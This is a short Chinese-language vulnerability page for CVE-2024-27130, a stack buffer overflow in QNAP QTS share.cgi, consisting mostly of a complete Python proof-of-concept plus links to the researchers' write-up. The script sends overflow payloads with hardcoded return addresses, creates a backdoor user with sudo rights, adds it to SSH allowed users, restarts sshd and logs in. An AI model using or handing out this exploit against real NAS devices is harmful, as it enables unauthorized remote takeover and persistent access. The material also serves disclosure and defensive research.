## QNAP-QTS溢出导致的未授权RCE漏洞(CVE-2024-27130)

share.cgi的No_Support_ACL函数中未修补的堆栈缓冲区溢出漏洞，该漏洞可让攻击者在满足特定先决条件时执行远程代码。



## 利用脚本

```python
import argparse
import os
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(prog='PoC', description='PoC for CVE-2024-27130', usage="Obtain an 'ssid' by requesting a NAS user to share a file to you.")
parser.add_argument('host')
parser.add_argument('ssid')

def main(args):
    docmd(args, f"/../../../../usr/local/bin/useradd -p \\"$(openssl passwd -6 {parsedArgs.password})\\" watchtowr  #".encode('ascii'))
    docmd(args, b"/bin/sed -i -e 's/AllowUsers /AllowUsers watchtowr /' /etc/config/ssh/sshd_config # ")
    docmd(args, b"/../../../../bin/echo watchtowr ALL=\\\\(ALL\\\\) ALL >> /usr/etc/sudoers # ")
    docmd(args, b"/../../../../usr/bin/killall -SIGHUP sshd # ")

def docmd(args, cmd):
    print(f"Doing command '{cmd}'")
    buf = cmd
    buf = buf + b'A' * (4082 - len(buf))
    buf = buf + (0x54140508).to_bytes(4, 'little')  # delimiter
    buf = buf + (0x54140508).to_bytes(4, 'little')  # r0 and r3
    buf = buf + (0x54140508).to_bytes(4, 'little')  #
    buf = buf + (0x54140508).to_bytes(4, 'little')  # r7
    buf = buf + (0x73af5148).to_bytes(4, 'little')  # pc

    payload = {
        'ssid': args.ssid,
        'func': 'get_file_size',
        'total': '1',
        'path': '/',
        'name': buf
    }

    requests.post(
        f"https://{args.host}/cgi-bin/filemanager/share.cgi",
        verify=False,
        data=payload,
        timeout=2
    )

def makeRandomString():
    chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(chars[c % len(chars)] for c in os.urandom(8))

parsedArgs = parser.parse_args()
parsedArgs.password = makeRandomString()

main(parsedArgs)
print(f"Created new user OK. Log in with password '{parsedArgs.password}' when prompted.")
os.system(f'ssh watchtowr@{parsedArgs.host}')
```



## 漏洞分析

- [QNAP QTS - QNAPping At The Wheel (CVE-2024-27130 and friends) (watchtowr.com)](https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/)
- [watchtowrlabs/CVE-2024-27130: PoC for CVE-2024-27130 (github.com)](https://github.com/watchtowrlabs/CVE-2024-27130)